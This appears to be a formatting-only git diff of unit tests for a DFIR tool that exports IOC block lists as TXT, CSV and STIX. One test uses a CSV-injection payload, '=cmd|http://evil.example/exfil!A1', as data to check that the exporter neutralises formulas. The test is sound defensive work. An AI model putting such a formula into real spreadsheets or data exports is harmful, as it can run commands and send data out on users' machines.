@@ -33,9 +33,9 @@ describe("filterBlocklistIocs", () => {
 
   it("excludes IOCs below minSeverity (no enrichment → Info)", () => {
     const iocs = [
-      ioc({ id: "i1", type: "ip", value: "10.0.0.1", enrichments: [enrich("malicious")] }),  // High
+      ioc({ id: "i1", type: "ip", value: "10.0.0.1", enrichments: [enrich("malicious")] }), // High
       ioc({ id: "i2", type: "ip", value: "10.0.0.2", enrichments: [enrich("suspicious")] }), // Medium
-      ioc({ id: "i3", type: "ip", value: "10.0.0.3" }),                                       // Info (no enrichment)
+      ioc({ id: "i3", type: "ip", value: "10.0.0.3" }), // Info (no enrichment)
     ];
     const med = filterBlocklistIocs(iocs, { minSeverity: "Medium" });
     expect(med.map((r) => r.ioc.id).sort()).toEqual(["i1", "i2"]);
@@ -48,7 +48,9 @@ describe("filterBlocklistIocs", () => {
   });
 
   it("harmless verdict maps to Low severity", () => {
-    const iocs = [ioc({ id: "i1", type: "domain", value: "cdn.safe.com", enrichments: [enrich("harmless")] })];
+    const iocs = [
+      ioc({ id: "i1", type: "domain", value: "cdn.safe.com", enrichments: [enrich("harmless")] }),
+    ];
     expect(filterBlocklistIocs(iocs, { minSeverity: "Low" })).toHaveLength(1);
     expect(filterBlocklistIocs(iocs, { minSeverity: "Medium" })).toHaveLength(0);
   });
@@ -87,7 +89,12 @@ describe("filterBlocklistIocs", () => {
 
   it("worst verdict wins when multiple enrichments exist", () => {
     const iocs = [
-      ioc({ id: "i1", type: "ip", value: "1.2.3.4", enrichments: [enrich("harmless"), enrich("malicious", "TF")] }),
+      ioc({
+        id: "i1",
+        type: "ip",
+        value: "1.2.3.4",
+        enrichments: [enrich("harmless"), enrich("malicious", "TF")],
+      }),
     ];
     // harmless alone → Low, but malicious also present → High
     expect(filterBlocklistIocs(iocs, { minSeverity: "High" })).toHaveLength(1);
@@ -99,7 +106,10 @@ describe("filterBlocklistIocs", () => {
 describe("buildIocBlocklistTxt", () => {
   it("produces the standard header with case name and timestamp", () => {
     const state = emptyState("c1");
-    const txt = buildIocBlocklistTxt(state, { caseName: "Ransomware 2026", generatedAt: "2026-06-13T10:00:00Z" });
+    const txt = buildIocBlocklistTxt(state, {
+      caseName: "Ransomware 2026",
+      generatedAt: "2026-06-13T10:00:00Z",
+    });
     expect(txt).toContain("# DFIR Companion — IOC Block List");
     expect(txt).toContain("# Case: Ransomware 2026");
     expect(txt).toContain("# Generated: 2026-06-13T10:00:00Z");
@@ -179,7 +189,9 @@ describe("buildIocBlocklistCsv", () => {
     const state = emptyState("c1");
     state.iocs = [
       ioc({
-        id: "i1", type: "ip", value: "1.2.3.4",
+        id: "i1",
+        type: "ip",
+        value: "1.2.3.4",
         enrichments: [enrich("malicious", "VirusTotal"), enrich("malicious", "ThreatFox")],
       }),
     ];
@@ -215,7 +227,12 @@ describe("buildIocBlocklistCsv", () => {
   it("guards CSV injection: a value starting with = is prefixed with a single quote", () => {
     const state = emptyState("c1");
     state.iocs = [
-      ioc({ id: "i1", type: "url", value: "=cmd|http://evil.example/exfil!A1", enrichments: [enrich("malicious")] }),
+      ioc({
+        id: "i1",
+        type: "url",
+        value: "=cmd|http://evil.example/exfil!A1",
+        enrichments: [enrich("malicious")],
+      }),
     ];
     const csv = buildIocBlocklistCsv(state, { minSeverity: "Low" });
     // The leading = must be neutralized so Excel/LibreOffice don't run it as a formula.
@@ -296,8 +313,8 @@ describe("buildIocBlocklistStix", () => {
     ];
     const bundle = buildIocBlocklistStix(state, { minSeverity: "Info" });
     const byName = Object.fromEntries(bundle.objects.map((o) => [String(o.name), o]));
-    expect((byName["1.2.3.4"].indicator_types as string[])).toContain("malicious-activity");
-    expect((byName["evil.com"].indicator_types as string[])).toContain("anomalous-activity");
-    expect((byName["2.3.4.5"].indicator_types as string[])).toContain("unknown");
+    expect(byName["1.2.3.4"].indicator_types as string[]).toContain("malicious-activity");
+    expect(byName["evil.com"].indicator_types as string[]).toContain("anomalous-activity");
+    expect(byName["2.3.4.5"].indicator_types as string[]).toContain("unknown");
   });
 });
